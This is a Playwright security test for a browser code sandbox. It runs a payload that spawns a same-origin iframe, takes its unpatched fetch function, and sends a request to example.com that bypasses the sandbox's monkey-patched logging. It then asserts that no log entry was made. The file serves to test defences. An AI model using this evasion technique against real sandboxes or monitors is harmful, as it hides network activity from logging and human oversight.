import { test, expect } from '@playwright/test';

test('Monkey Patch Bypass (Logging Evasion)', async ({ page }) => {
  await page.goto('http://localhost:3333/playground/security.html');
  await page.waitForFunction(() => window.SandboxControl !== undefined);
  await page.evaluate(() => window.SandboxControl.sandboxElement.setAttribute('script-unsafe', 'true'));
  await page.waitForTimeout(2000);

  // Exploit: Remove the monkey patch on window.fetch
  // Since the user code runs in the same realm as the patch (inner-frame),
  // they can simply delete or restore the original function if they can find it.
  // The patch stored 'originalFetch' in a closure, so it's hard to retrieve the original.
  // BUT, they can create a new iframe (same origin) and steal the clean fetch from there!
  // Oh wait, frame-src is restricted?
  // Server-side CSP: frame-src 'self' (which is uuid.sandbox.localhost).
  // So they CAN create a same-origin iframe.

  const payload = `
    (async () => {
        // 1. Spawn clean iframe
        const f = document.createElement('iframe');
        f.src = 'inner-frame.html'; // Same origin
        document.body.appendChild(f);
        await new Promise(r => f.onload = r);

        // 2. Steal clean fetch
        const cleanFetch = f.contentWindow.fetch;

        // 3. Use clean fetch to bypass logging
        cleanFetch('http://example.com', { mode: 'no-cors' }).then(() => {
            window.top.postMessage({ type: 'PWN_SUCCESS', message: 'Silent Fetch' }, '*');
        });
    })();
  `;

  await page.evaluate((code) => {
    window.SandboxControl.execute(code);
  }, payload);

  // Verify success message
  const result = await page.evaluate(() => {
      return new Promise(resolve => {
          window.addEventListener('message', m => {
              if (m.data.type === 'PWN_SUCCESS') resolve(m.data);
          });
      });
  });

  // Verify NO logs
  const logs = await page.evaluate(() => window.SandboxControl.getLogs());
  const fetchLogs = logs.filter(l => l.message.includes('example.com'));
  expect(fetchLogs.length).toBe(0);
});
